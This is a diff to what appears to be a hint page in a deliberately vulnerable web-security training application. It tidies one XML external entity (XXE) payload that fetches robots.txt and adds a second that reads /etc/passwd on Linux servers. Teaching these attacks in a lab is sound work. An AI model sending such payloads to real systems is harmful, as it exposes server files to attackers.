@@ -137,8 +137,15 @@
 		This is a slightly different version of XXE to fetch the robots.txt.
 		<br/>
 <code>
-&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE change-log [ &lt;!ENTITY systemEntity SYSTEM &quot;robots.txt&quot;&gt; ]&gt; &lt;change-log&gt; &lt;text&gt;&amp;systemEntity;&lt;/text&gt;; &lt;/change-log&gt;
+&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE change-log [ &lt;!ENTITY systemEntity SYSTEM &quot;robots.txt&quot;&gt; ]&gt; &lt;change-log&gt; &lt;text&gt;&amp;systemEntity;&lt;/text&gt; &lt;/change-log&gt;
 </code>
+		<br/>
+		This example of XXE uses a slightly different syntax to fetch the passwd file on Linux systems (Credit: Robin @digininja Wood)
+		<br/>
+<code>
+&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot; ?&gt;&lt;!DOCTYPE demo [&lt;!ELEMENT demo (#PCDATA)&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;a&gt;&lt;inject&gt;&amp;xxe;&lt;/inject&gt;&lt;/a&gt;
+</code>
+
 		<br/>
 		This injection results in a cross site script.
 		<br/>
